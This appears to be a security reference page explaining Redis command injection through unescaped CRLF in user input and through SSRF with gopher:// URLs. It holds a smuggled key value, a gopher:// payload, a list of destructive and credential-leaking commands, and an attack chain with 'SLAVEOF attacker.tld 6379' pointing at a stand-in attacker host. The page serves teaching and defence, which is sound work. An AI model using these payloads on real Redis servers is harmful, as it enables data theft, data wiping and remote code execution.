---
title: "Command injection: smuggling commands into the RESP protocol"
description: "Unescaped CRLF in user input, or SSRF to a Redis port, lets an attacker append extra RESP commands and reach FLUSHALL, CONFIG, SLAVEOF, and MODULE LOAD."
keywords:
  - RESP protocol
  - CRLF injection
  - Redis SSRF
  - FLUSHALL
  - SLAVEOF REPLICAOF
  - MODULE LOAD
---

# Command injection

Redis clients and servers talk over **RESP** (REdis Serialization Protocol), a text-oriented protocol where every element is terminated by a carriage-return/line-feed pair (`\r\n`). A command such as `SET foo bar` is serialized as an array of bulk strings:

```
*3\r\n$3\r\nSET\r\n$3\r\nfoo\r\n$3\r\nbar\r\n
```

Redis is also tolerant of **inline commands**: a plain line like `SET foo bar\r\n` is accepted and parsed on its own line. Both facts matter for injection. Because the protocol delimits commands with `\r\n`, any unescaped CRLF that reaches the connection inside attacker-controlled data ends the current command and begins a new one. The attacker does not need to break out of a quoted string; they need a newline in the byte stream.

## Where CRLF reaches the connection

Two sinks dominate.

First, a **value placed into a command**. When application code builds a command line from user input and writes it to the socket, a newline in that input splits one command into two:

```
key = "legit\r\nCONFIG GET requirepass"
```

If this value is written inline as `SET cache:<key> 1\r\n`, the server sees `SET cache:legit`, then a separate `CONFIG GET requirepass`. Any field that feeds a key name, a value, or a channel name without stripping `\r\n` is a candidate.

Second, **SSRF to a Redis port**. Redis commonly listens on TCP 6379 with no authentication inside a trusted network. A server-side request forgery that lets the attacker control raw bytes, a `gopher://` URL, a `dict://` URL, or a protocol-smuggling CRLF in an HTTP request to `host:6379`, delivers inline commands straight to the server:

```
gopher://127.0.0.1:6379/_%0D%0AINFO%0D%0A
```

`%0D%0A` is the URL-encoded CRLF that separates each smuggled command. A multi-line `gopher://` payload can carry an entire attack chain in one request.

## Dangerous commands to reach

Once arbitrary commands can be sent, the target set is wide:

- **`FLUSHALL` / `FLUSHDB`** wipe every key, destructive and useful for forcing cache-miss behavior.
- **`KEYS *`** enumerates every key in the store; `SCAN` does the same without blocking. `GET`, `HGETALL`, `LRANGE`, and `MGET` then read values, often session tokens or cached credentials.
- **`CONFIG GET *`** dumps the running configuration (including `requirepass`, `dir`, `dbfilename`); **`CONFIG SET`** rewrites it and underpins the write-to-disk RCE chain (see [CONFIG SET abuse](config-set-abuse.md)).
- **`DEBUG`** exposes internals; `DEBUG SLEEP 10` stalls the server and `DEBUG OBJECT` leaks key metadata.
- **`SLAVEOF` / `REPLICAOF`** point the instance at an attacker-controlled master (`SLAVEOF attacker.tld 6379`), which replicates a dataset the attacker chooses and, combined with module replication, has been a path to code execution.
- **`MODULE LOAD /path/to/module.so`** loads a native module where modules are enabled, direct code execution from a shared object already on disk.

## Example smuggled chain

Delivered through a `gopher://` SSRF, a reconnaissance-then-pivot sequence:

```
INFO
CONFIG GET dir
SLAVEOF attacker.tld 6379
```

Each line is separated by `\r\n` on the wire. The `INFO` and `CONFIG GET dir` responses reveal the Redis version and the working directory that the [CONFIG SET abuse](config-set-abuse.md) chain depends on.

## References

- [Redis: RESP protocol specification](https://redis.io/docs/latest/develop/reference/protocol-spec/)
- [Redis: command reference](https://redis.io/docs/latest/commands/)
- [PayloadsAllTheThings: Redis SSRF and command injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
